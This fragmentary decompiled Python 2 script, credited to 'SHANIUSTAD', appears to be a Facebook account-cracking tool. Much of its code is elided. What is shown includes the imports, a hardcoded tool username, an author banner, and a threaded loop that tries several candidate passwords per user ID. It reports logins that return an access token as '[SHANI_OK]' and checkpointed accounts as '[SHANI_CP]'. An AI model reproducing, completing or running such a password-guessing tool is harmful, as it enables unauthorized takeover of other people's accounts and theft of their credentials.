...
# Decompiled By Zeeshan Altaf

# Github : https://github.com/SHANIUSTAD

# uncompyle6 version 

# Original written By Zeeshan Altaf

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass

__author__ = 'SHANIUSTAD'

__copyright = 'All rights reserved . Copyright  SHANIUSTAD'

CorrectUsername = 'SHANIKHAN'
...
logo = """
 ...
 Facebook :          Zeeshan Qureshi

 GitHub   :        github.com/SHANIUSTAD
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[92m  [SHANI_OK]  ' + k + c + user + '  |  ' + pass1
                ...
                print '\x1b[1;91m  [SHANI_CP]' + k + c + user + '  |  ' + pass1
                ...
                if 'access_token' in q:
                    ...
                    print '\x1b[1;92m  [SHANI_OK] ' + k + c + user + '  |  ' + pass2
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;92m  [SHANI_OK]  ' + k + c + user + '  |  ' + pass3
